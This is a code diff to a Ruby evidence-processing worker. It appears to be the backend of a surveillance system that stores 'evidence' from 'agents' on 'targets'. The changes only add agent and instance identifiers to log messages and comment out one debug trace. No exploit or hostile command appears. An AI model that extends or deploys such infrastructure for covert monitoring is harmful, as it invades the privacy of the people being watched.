@@ -83,15 +83,15 @@ class InstanceWorker
                 if forwarding?
                   path = "forwarded/#{evidence_id}.dec"
                   f = File.open(path, 'wb') {|f| f.write data}
-                  trace :debug, "[#{evidence_id}] forwarded decoded evidence #{evidence_id} to #{path}"
+                  trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] forwarded decoded evidence #{evidence_id} to #{path}"
                 end
               end
             rescue EmptyEvidenceError => e
-              trace :info, "[#{evidence_id}] deleting empty evidence #{evidence_id}"
+              trace :info, "[#{evidence_id}:#{@ident}:#{@instance}] deleting empty evidence #{evidence_id}"
               RCS::DB::GridFS.delete(evidence_id, "evidence")
               next
             rescue EvidenceDeserializeError => e
-              trace :warn, "[#{evidence_id}] decoding failed for #{evidence_id}: #{e.to_s}, deleting..."
+              trace :warn, "[#{evidence_id}:#{@ident}:#{@instance}] decoding failed for #{evidence_id}: #{e.to_s}, deleting..."
               RCS::DB::GridFS.delete(evidence_id, "evidence")
               next
             end
@@ -121,7 +121,7 @@ class InstanceWorker
 
               ev.process if ev.respond_to? :process
 
-              trace :debug, "[#{evidence_id}] processing evidence of type #{ev[:type]}"
+              trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] processing evidence of type #{ev[:type]}"
 
               # override original type
               ev[:type] = ev.type if ev.respond_to? :type
@@ -136,12 +136,12 @@ class InstanceWorker
 
               begin
                 evidence = processor.feed ev
-                trace :debug, "EVIDENCE? #{evidence.inspect}"
+                #trace :debug, "EVIDENCE? #{evidence.inspect}"
                 #RCS::DB::Alerting.new_evidence evidence unless evidence.nil?
               rescue Exception => e
-                trace :error, "[#{evidence_id}] cannot store evidence, #{e.message}"
-                trace :error, "[#{evidence_id}] #{e.backtrace}"
-                trace :debug, "[#{evidence_id}] refreshing agent and target information and retrying."
+                trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
+                trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] #{e.backtrace}"
+                trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] refreshing agent and target information and retrying."
                 get_agent_target
                 retry if attempt ||= 0 and attempt += 1 and attempt < 3
               end
@@ -154,16 +154,16 @@ class InstanceWorker
             case action
               when :delete_raw
                 RCS::DB::GridFS.delete(evidence_id, "evidence")
-                trace :debug, "[#{evidence_id}] deleted raw evidence"
+                trace :debug, "[#{evidence_id}:#{@ident}:#{@instance}] deleted raw evidence"
             end
 
           rescue Mongo::ConnectionFailure => e
-            trace :error, "[#{evidence_id}] cannot connect to database, retrying in 5 seconds ..."
+            trace :error, "[#{evidence_id}:#{@ident}:#{@instance}] cannot connect to database, retrying in 5 seconds ..."
             sleep 5
             retry
           rescue Exception => e
-            trace :fatal, "[#{evidence_id}] FAILURE: " << e.to_s
-            trace :fatal, "[#{evidence_id}] EXCEPTION: " + e.backtrace.join("\n")
+            trace :fatal, "[#{evidence_id}:#{@ident}:#{@instance}] FAILURE: " << e.to_s
+            trace :fatal, "[#{evidence_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")
 
             Dir.mkdir "forwarded" unless File.exists? "forwarded"
             path = "forwarded/#{evidence_id}.raw"
